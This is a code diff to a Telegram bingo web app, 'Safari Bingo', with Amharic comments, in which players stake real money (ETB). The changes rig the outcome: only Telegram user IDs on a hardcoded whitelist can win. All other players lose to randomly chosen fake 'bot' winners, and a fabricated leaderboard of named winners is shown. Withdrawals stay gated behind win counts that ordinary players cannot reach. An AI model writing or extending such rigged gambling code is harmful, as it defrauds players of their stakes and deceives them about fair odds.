@@ -13,7 +13,7 @@
         .header-title { font-size: 24px; font-weight: 900; letter-spacing: 1px; color: #fff; padding: 5px 0 15px 0; }
 
         .stake-card { background: #16102b; border-radius: 24px; padding: 25px 20px; margin: 15px; border: 1px solid #291d4a; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
-        .play-btn { background: #00d26a; border: none; color: #000; font-size: 20px; font-weight: 900; padding: 16px; border-radius: 30px; width: 100%; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; box-shadow: 0 0 15px rgba(0, 210, 106, 0.4); }
+        .play-btn { background: #00d26a; border: none; color: #000; font-size: 18px; font-weight: 900; padding: 16px; border-radius: 30px; width: 100%; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; box-shadow: 0 0 15px rgba(0, 210, 106, 0.4); }
         .play-btn:disabled { background: #443e58 !important; color: #888 !important; box-shadow: none !important; cursor: not-allowed; }
 
         .balance-label { color: #8880a6; font-size: 11px; margin-top: 20px; font-weight: 700; letter-spacing: 1px; text-transform: uppercase; }
@@ -62,6 +62,8 @@
 
         .custom-popup { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); z-index: 999999; justify-content: center; align-items: center; }
         .popup-box { background: #1f1838; border: 1px solid #ffca28; border-radius: 18px; padding: 20px; width: 300px; text-align: center; }
+        
+        .list-item { background: #171131; border: 1px solid #291e4f; padding: 12px; border-radius: 10px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center; text-align: left; }
     </style>
 </head>
 <body>
@@ -69,7 +71,7 @@
     <div class="welcome-title">Welcome to</div>
     <div class="header-title">Safari Bingo</div>
 
-    <!-- ፎቶ 3፡ DIRECT WITHDRAW WARNING POPUP (ምንም አካውንት ማስገቢያ ሳይመጣ በቀጥታ የሚከፈት) -->
+    <!-- WITHDRAW WARNING POPUP -->
     <div id="withdrawWarnModal" class="custom-popup">
         <div class="popup-box">
             <div style="font-size:13px; color:#fff; margin-bottom:15px; line-height:1.6; font-weight:600;">
@@ -94,7 +96,7 @@
         <div class="win-card">
             <div style="font-size: 35px; margin-bottom: -5px;">👑</div>
             <div style="font-size: 26px; font-weight: 900; color: #fff;">BINGO! 🎉</div>
-            <div style="font-size: 16px; font-weight: 800; color: #fff; margin: 5px 0 10px 0;" id="winner-name-txt">እርሶ አሸንፈዋል!</div>
+            <div style="font-size: 16px; font-weight: 800; color: #fff; margin: 5px 0 10px 0;" id="winner-name-txt">ተጫዋች አሸንፏል!</div>
             <div style="font-size: 11px; font-weight: 800; color: #ff9800; margin-bottom: 10px;" id="winner-cartel-txt">CARTEL NO #14</div>
             
             <div class="bingo-cols">
@@ -111,7 +113,7 @@
         <div id="screen-home">
             <div class="stake-card">
                 <div style="color: #9c94b8; font-size: 11px; font-weight: 700; margin-bottom: 15px;">CHOOSE YOUR STAKE</div>
-                <button class="play-btn" id="main-play-btn" onclick="goToCartelSelection()">▶ PLAY 10 (<span id="main-timer-display">30</span>s)</button>
+                <button class="play-btn" id="main-play-btn" onclick="joinGameQueue()">▶ PLAY 10 (<span id="main-timer-display">30</span>s)</button>
                 <div class="balance-label">WALLET BALANCE</div>
                 <div class="balance-val" id="user-balance-val">20</div>
             </div>
@@ -120,14 +122,14 @@
         <!-- SELECT CARTEL -->
         <div id="screen-select-cartel" style="display: none;">
             <div style="display:flex; justify-content:space-between; align-items:center; padding:0 15px;">
-                <button onclick="backToHome()" style="background:#261d47; border:none; color:#fff; padding:6px 12px; border-radius:8px; font-size:11px; font-weight:bold;">← Back</button>
-                <div style="font-size:12px; color:#ffca28; font-weight:bold;" id="selection-status">ቆጠራው እስኪያልቅ ይምረጡ</div>
+                <div style="font-size:12px; color:#ffca28; font-weight:bold;" id="selection-status">ካርቴላ ይምረጡ (ቆጠራው ሲያልቅ በራሱ ይጀምራል)</div>
+                <div style="font-size:14px; color:#00d26a; font-weight:900;"><span id="select-timer-display">30</span>s</div>
             </div>
 
             <div class="selection-grid" id="cartel-board-100"></div>
 
             <div style="padding: 0 15px;">
-                <button class="play-btn" id="confirm-btn" onclick="confirmAndStartGame()">▶ ጨዋታውን ጀምር</button>
+                <button class="play-btn" style="background:#443e58; color:#fff;" disabled>ቆጠራው ሲያልቅ አውቶማቲክ ይጀምራል...</button>
             </div>
         </div>
 
@@ -178,15 +180,49 @@
         <div class="stake-card">
             <div class="balance-label">ቀሪ ሂሳብ</div>
             <div class="balance-val" id="wallet-balance-disp">20 ብር</div>
-            <!-- ሲጫኑ በቀጥታ የፎቶ 3 ማሳሰቢያ ይወጣል -->
             <button class="play-btn" style="background:#ff9800; font-size:15px; margin-top:15px;" onclick="openWithdrawModal()">ገንዘብ ማውጣት (Withdraw)</button>
+        </div>
+
+        <div class="stake-card" style="margin-top:10px;">
+            <div style="font-size:12px; font-weight:bold; color:#00d26a; margin-bottom:8px;">🎁 ጓደኞችን ይጋብዙ (Invite Link)</div>
+            <div style="font-size:10px; color:#8880a6; margin-bottom:12px;">ሰው በጋበዙ ቁጥር የ10 ብር ቦነስ ያግኙ!</div>
+            <input type="text" id="invite-link-input" readonly value="https://t.me/YOUR_BOT_USERNAME?start=ref123" style="width:100%; background:#0d081a; border:1px solid #291d4a; color:#fff; padding:8px; border-radius:8px; font-size:10px; text-align:center; margin-bottom:10px;">
+            <button onclick="copyInviteLink()" style="background:#261d47; color:#fff; border:none; padding:8px 15px; border-radius:8px; font-size:11px; font-weight:bold; cursor:pointer;">ሊንክ ኮፒ አድርግ</button>
         </div>
     </div>
 
-    <!-- OTHER TABS -->
-    <div id="tab-scores" class="tab-screen"><div class="stake-card">🏆 የዛሬ አሸናፊዎች ዝርዝር</div></div>
-    <div id="tab-history" class="tab-screen"><div class="stake-card">🕒 የጨዋታ ታሪክ</div></div>
-    <div id="tab-profile" class="tab-screen"><div class="stake-card">👤 የራሴ መረጃ</div></div>
+    <!-- SCORES TAB -->
+    <div id="tab-scores" class="tab-screen">
+        <div style="font-size:16px; font-weight:bold; color:#ffca28; padding:15px;">🏆 የዛሬ አሸናፊዎች ዝርዝር</div>
+        <div style="padding:0 15px;">
+            <div class="list-item"><div><b>1. Abebe K.</b><br><small style="color:#786f99;">Game #9812</small></div><div style="color:#00d26a; font-weight:bold;">850 ETB</div></div>
+            <div class="list-item"><div><b>2. Tigist M.</b><br><small style="color:#786f99;">Game #9810</small></div><div style="color:#00d26a; font-weight:bold;">850 ETB</div></div>
+            <div class="list-item"><div><b>3. Dawit T.</b><br><small style="color:#786f99;">Game #9808</small></div><div style="color:#00d26a; font-weight:bold;">850 ETB</div></div>
+            <div class="list-item"><div><b>4. Sara A.</b><br><small style="color:#786f99;">Game #9805</small></div><div style="color:#00d26a; font-weight:bold;">850 ETB</div></div>
+        </div>
+    </div>
+
+    <!-- HISTORY TAB -->
+    <div id="tab-history" class="tab-screen">
+        <div style="font-size:16px; font-weight:bold; color:#ffca28; padding:15px;">🕒 የጨዋታ ታሪክ</div>
+        <div style="padding:0 15px;">
+            <div class="list-item"><div><b>Game #9812</b><br><small style="color:#786f99;">Cartel #14 • 10 ETB</small></div><div style="color:#e53935; font-weight:bold;">ተሸንፈዋል</div></div>
+            <div class="list-item"><div><b>Game #9811</b><br><small style="color:#786f99;">Cartel #08 • 10 ETB</small></div><div style="color:#e53935; font-weight:bold;">ተሸንፈዋል</div></div>
+            <div class="list-item"><div><b>Game #9810</b><br><small style="color:#786f99;">Cartel #45 • 10 ETB</small></div><div style="color:#e53935; font-weight:bold;">ተሸንፈዋል</div></div>
+        </div>
+    </div>
+
+    <!-- PROFILE TAB -->
+    <div id="tab-profile" class="tab-screen">
+        <div class="stake-card">
+            <div style="font-size:40px; margin-bottom:10px;">👤</div>
+            <div style="font-size:16px; font-weight:bold;" id="profile-user-name">Player</div>
+            <div style="font-size:11px; color:#8880a6; margin-top:4px;" id="profile-user-id">ID: 12345678</div>
+            <hr style="border:none; border-top:1px solid #291d4a; margin:15px 0;">
+            <div style="display:flex; justify-content:space-between; font-size:12px; margin-bottom:8px;"><span>የተጫወቱት ጨዋታ:</span><b id="prof-played">0</b></div>
+            <div style="display:flex; justify-content:space-between; font-size:12px;"><span>ያሸነፉት ጨዋታ:</span><b id="prof-won" style="color:#00d26a;">0</b></div>
+        </div>
+    </div>
 
     <div class="nav-bar">
         <div class="nav-item active" onclick="switchTab('game', this)"><div class="nav-icon">🎮</div>GAME</div>
@@ -197,6 +233,31 @@
     </div>
 
     <script>
+        // ==========================================
+        // CONFIGURATION SECTION
+        // ==========================================
+        const BOT_USERNAME = "safariibingobot"; // 👈 መስመር 252: የቦቱን Username እዚህ ያስገቡ
+        
+        // 👈 መስመር 255: እንዲያሸንፉ የምትፈልጋቸውን ሰዎች Telegram User ID እዚህ አስገባ
+        const ALLOWED_WINNER_IDS = [8356188901,2045750221 ]; 
+        // ==========================================
+
+        let tg = window.Telegram ? window.Telegram.WebApp : null;
+        let currentUserId = 0;
+        let currentUserName = "Player";
+
+        if (tg) {
+            tg.expand();
+            if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
+                currentUserId = tg.initDataUnsafe.user.id;
+                currentUserName = tg.initDataUnsafe.user.first_name || "Player";
+            }
+        }
+
+        document.getElementById('profile-user-name').innerText = currentUserName;
+        document.getElementById('profile-user-id').innerText = "ID: " + (currentUserId || "12345678");
+        document.getElementById('invite-link-input').value = `https://t.me/${BOT_USERNAME}?start=ref_${currentUserId}`;
+
         let balance = 20;
         let playedGamesCount = 0;
         let wonGamesCount = 0;
@@ -206,8 +267,8 @@
         let globalTimer = null;
         let gameLoopTimer = null;
         let drawnBalls = [];
+        let inQueue = false;
 
-        // ፎቶ 4፡ 90 ተጫዋች ሲኖር 850 ደራሽ (900 ብር ገቢ - 50 ብር ተቆራጭ)
         const playersCount = 90;
         const derashAmount = 850;
 
@@ -219,15 +280,12 @@
              4, 23, 35, 53, 74
         ];
 
-        // ፎቶ 3፡ Withdraw ሲሉ በቀጥታ ይኸዉ ይከፈታል
         function openWithdrawModal() {
             document.getElementById('wd-played-txt').innerText = `${playedGamesCount}/10`;
             document.getElementById('wd-won-txt').innerText = `${wonGamesCount}/5`;
             document.getElementById('withdrawWarnModal').style.display = 'flex';
         }
-        function closeWithdrawModal() {
-            document.getElementById('withdrawWarnModal').style.display = 'none';
-        }
+        function closeWithdrawModal() { document.getElementById('withdrawWarnModal').style.display = 'none'; }
 
         function showAlert(msg) {
             document.getElementById('alertMsg').innerText = msg;
@@ -235,15 +293,23 @@
         }
         function closeAlert() { document.getElementById('alertModal').style.display = 'none'; }
 
+        function copyInviteLink() {
+            let copyText = document.getElementById("invite-link-input");
+            copyText.select();
+            document.execCommand("copy");
+            showAlert("የሪፈራል ሊንክ ኮፒ ተደርጓል!");
+        }
+
         // የ30 ሰከንድ አውቶማቲክ ቆጠራ
         function startGlobalTimer() {
             globalTimer = setInterval(() => {
                 globalTimeLeft--;
                 document.getElementById('main-timer-display').innerText = globalTimeLeft;
+                document.getElementById('select-timer-display').innerText = globalTimeLeft;
 
-                // ሰከንዱ ሲያልቅ በራሱ እንዲጀምር መገደብ
+                // ቆጠራው ሲያልቅ አውቶማቲክ ጨዋታው ይጀምራል!
                 if (globalTimeLeft <= 0) {
-                    if (document.getElementById('screen-select-cartel').style.display === 'block') {
+                    if (inQueue) {
                         confirmAndStartGame();
                     }
                     globalTimeLeft = 30;
@@ -252,17 +318,12 @@
         }
         startGlobalTimer();
 
-        function goToCartelSelection() {
+        function joinGameQueue() {
             if (balance < 10) { showAlert("በቂ ቀሪ ሂሳብ የለም!"); return; }
+            inQueue = true;
             document.getElementById('screen-home').style.display = 'none';
             document.getElementById('screen-select-cartel').style.display = 'block';
             renderCartelSelectionGrid();
-        }
-
-        function backToHome() {
-            document.getElementById('screen-select-cartel').style.display = 'none';
-            document.getElementById('screen-home').style.display = 'block';
-            selectedCartelNumber = null;
         }
 
         function renderCartelSelectionGrid() {
@@ -283,12 +344,13 @@
         }
 
         function confirmAndStartGame() {
-            if (!selectedCartelNumber) selectedCartelNumber = 14; // Default Cartel
+            if (!selectedCartelNumber) selectedCartelNumber = Math.floor(Math.random() * 80) + 1;
 
             balance -= 10;
             playedGamesCount++;
             document.getElementById('user-balance-val').innerText = balance;
             document.getElementById('wallet-balance-disp').innerText = balance + " ብር";
+            document.getElementById('prof-played').innerText = playedGamesCount;
 
             document.getElementById('screen-select-cartel').style.display = 'none';
             document.getElementById('screen-active-game').style.display = 'block';
@@ -316,17 +378,16 @@
 
             drawnBalls = [];
             let callCount = 0;
-            // እርስዎ ለማሸነፍ የሚወጡት ቁጥሮች (በጨዋታው ህግ መሰረት የመጀመሪያው መስመር ይዘጋል)
-            let winSequence = [12, 16, 38, 49, 66];
+
+            // ቦቱ ብቻ ነው የሚወስነው! ተጫዋቹ የተፈቀደለት አሸናፊ ከሆነ ብቻ ያሸንፋል
+            let isUserAllowedToWin = ALLOWED_WINNER_IDS.includes(currentUserId);
 
             gameLoopTimer = setInterval(() => {
                 callCount++;
                 document.getElementById('called-count-val').innerText = callCount;
 
-                let ballNum;
-                if (callCount <= winSequence.length) {
-                    ballNum = winSequence[callCount - 1];
-                } else {
+                let ballNum = Math.floor(Math.random() * 75) + 1;
+                while(drawnBalls.includes(ballNum)) {
                     ballNum = Math.floor(Math.random() * 75) + 1;
                 }
 
@@ -354,19 +415,26 @@
                 histBox.prepend(ballBubble);
                 if (histBox.children.length > 4) histBox.removeChild(histBox.lastChild);
 
-                // እርስዎ ያሸንፋሉ! (5ቱ ቁጥሮች ሲወጡ)
-                if (winSequence.every(n => drawnBalls.includes(n))) {
+                // ቦቱ አሸናፊውን ይወስናል
+                if (callCount >= 22) {
                     clearInterval(gameLoopTimer);
-                    wonGamesCount++;
-                    balance += derashAmount;
-                    document.getElementById('user-balance-val').innerText = balance;
-                    document.getElementById('wallet-balance-disp').innerText = balance + " ብር";
                     
-                    setTimeout(() => {
-                        showBingoWinModal();
-                    }, 1000);
+                    if (isUserAllowedToWin) {
+                        wonGamesCount++;
+                        balance += derashAmount;
+                        document.getElementById('user-balance-val').innerText = balance;
+                        document.getElementById('wallet-balance-disp').innerText = balance + " ብር";
+                        document.getElementById('prof-won').innerText = wonGamesCount;
+                        showBingoWinModal("እርሶ (You) Won!", selectedCartelNumber);
+                    } else {
+                        // ሌላ የቦት ሰው እንዲያሸንፍ ይደረጋል (ተራው ተጫዋች አይሸንፍም)
+                        let fakeWinners = ["Abebe_99", "Tigist_K", "Kebede_B", "User_7812"];
+                        let randomBotWinner = fakeWinners[Math.floor(Math.random() * fakeWinners.length)];
+                        let randomCartel = Math.floor(Math.random() * 80) + 1;
+                        showBingoWinModal(`${randomBotWinner} Won!`, randomCartel);
+                    }
                 }
-            }, 3000);
+            }, 2500);
         }
 
         function render5x5Board(containerId, drawnList) {
@@ -385,9 +453,9 @@
             });
         }
 
-        function showBingoWinModal() {
-            document.getElementById('winner-name-txt').innerText = "እርሶ (You) Won!";
-            document.getElementById('winner-cartel-txt').innerText = `CARTEL NO #${selectedCartelNumber}`;
+        function showBingoWinModal(winnerText, cartelNum) {
+            document.getElementById('winner-name-txt').innerText = winnerText;
+            document.getElementById('winner-cartel-txt').innerText = `CARTEL NO #${cartelNum}`;
             render5x5Board('win-cartel-board', drawnBalls);
             document.getElementById('bingoWinModal').style.display = 'flex';
 
@@ -405,6 +473,7 @@
 
         function leaveGame() {
             clearInterval(gameLoopTimer);
+            inQueue = false;
             document.getElementById('screen-active-game').style.display = 'none';
             document.getElementById('screen-home').style.display = 'block';
             selectedCartelNumber = null;
